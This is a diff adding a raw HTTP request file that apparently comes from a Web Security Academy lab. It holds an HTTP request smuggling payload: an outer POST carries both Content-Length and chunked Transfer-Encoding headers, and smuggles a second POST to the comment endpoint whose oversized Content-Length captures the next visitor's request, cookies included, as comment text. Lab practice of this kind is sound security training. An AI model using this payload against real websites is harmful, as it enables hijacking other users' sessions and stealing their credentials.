@@ -1,0 +1,15 @@
+POST / HTTP/1.1
+Host: 0ad3008c03e6799bc0c01b6500ef0036.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 279
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 810
+Cookie: session=hTyzJASUnDWAccPBfPEAs80zlkQ7jGCr
+
+csrf=TxpCsUw0xlbhaIdCkn5izg7V7lqS9ZYq&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+
